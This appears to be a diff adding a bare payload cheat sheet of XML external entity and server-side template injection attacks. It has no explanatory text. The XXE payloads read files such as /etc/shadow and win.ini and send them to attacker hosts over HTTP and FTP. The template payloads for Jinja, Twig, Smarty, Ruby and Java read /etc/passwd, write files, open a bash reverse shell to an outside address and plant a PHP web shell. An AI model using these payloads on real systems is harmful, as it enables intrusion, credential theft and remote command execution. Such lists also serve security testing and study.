@@ -1,0 +1,89 @@
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM
+"http://x.x.x.x:443/test.txt"> ]>
+<r>&sp;</r>
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM
+"http://x.x.x.x:443/ev.xml">
+%sp;
+%param1; ]>
+<r>&exfil;</r>
+ev.xml
+<!ENTITY % data SYSTEM
+"file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM
+'http://x.x.x.x:443/?%data;'>">
+
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % data3 SYSTEM
+"file:///etc/shadow">
+<!ENTITY % sp SYSTEM
+"http://EvilHost:port/sp.dtd">
+%sp;
+%param3;
+%exfil; ]>
+
+<!ENTITY % param3 "<!ENTITY &#x25; exfil
+SYSTEM 'ftp://Evilhost:port/%data3;'>">
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % start "<![CDATA["> <!ENTITY %
+stuff SYSTEM
+"file:///usr/local/tomcat/webapps/custom
+app/WEB-INF/applicationContext.xml ">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM
+"http://evil/evil.xml">
+%dtd; ]>
+<root>&all;</root>
+
+<!ENTITY all "%start;%stuff;%end;">
+
+<!DOCTYPE :. SYTEM "http://"
+<!DOCTYPE :_-_: SYTEM "http://"
+<!DOCTYPE {0xdfbf} SYSTEM "http://"
+
+a{*comment*}b Smarty
+${"z".join("ab")} Mako
+{{7*'7'}} 49 Twig 777777 Jinja
+<%= 7*7%> Ruby
+
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''. class . mro [2]. subclasses () }}
+{{''. class . mro [2]. subclasses ()[40]('/etc/passwd').read() }}
+{{''. class . mro [2]. subclasses ()[40]('/var/www/html/hello.txt', 'w').write('Hello !') }}
+{{''. class . mro [2]. subclasses ()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
+{{ config['RUNCMD']('bash -i >&/dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }}
+
+Java
+
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+
+Twig
+{{_self.env.setCache("ftp://[адресвашего сервера]:2121")}}
+{{_self.env.loadTemplate("backdoor")}}
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+Ruby
+<%= File.open('/etc/passwd').read %>
+<%= Dir.entries('/') %>
+
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']);?>",self::clearConfig())}
+
+
+
